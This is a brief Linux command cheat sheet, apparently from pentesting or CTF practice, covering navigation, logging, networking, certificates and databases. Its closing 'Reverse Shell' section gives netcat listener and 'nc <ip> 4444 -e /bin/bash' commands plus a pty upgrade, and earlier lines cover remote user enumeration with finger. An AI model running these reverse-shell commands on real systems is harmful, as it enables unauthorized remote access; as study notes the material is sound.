## Search and Navigation
- `pwd` : Display the current working directory.
- `ls` : List files in the current directory.
- `lsblk` : List mounted disks and partitions.
- `locate <file_name>` : Search for a file in the system.
- `which <command_name>` : Show the path of a command's executable.

## History & Logging
- `history` : Display the history of executed commands.
- `script my_log_file.txt` : Record the entire terminal session into a text file.

## Networking & Services
- `telnet <host> 80` : Test connection to a service.
  - Example:
    ```
    telnet example.com 80
    GET / HTTP/1.1
    Host: example.com
    ```

- `finger @<ip>` : List the users on a remote machine.
- `finger fabiano@<ip>` : Get specific information about a user.
- `wget -r -np -nH --cut-dirs=0 http://192.168.1.100:8000/` : Download all files/folders from a directory hosted on a Python web server.
- `ss -tulpn`: Display all the open port.


## System
- `kill {pid}`: Kill a process
- `find / -name "*...*" 2>/dev/null`: Search a word in the system 

## Crypto & Certificates
- `openssl x509 -in key.pem -text -noout` : Analyze a X.509 certificate.

## Databases
- `sqlite3 filedb.sqlite` : Start an SQLite session on a `.sqlite` file.

## File Information
- `file <file_name>` : Display the file type.

## Reverse Shell
- `python3 -c 'import pty; pty.spawn("/bin/bash")'` : Upgrade a reverse shell to a fully interactive shell.
- `nc -lvnp 4444`: Open port 4444
- `nc <ip> 4444 > file.txt`: Retrieve a file from an open port on other machine 
- `nc <ton_ip> 4444 -e /bin/bash`: Connect to the reverse shell with nc

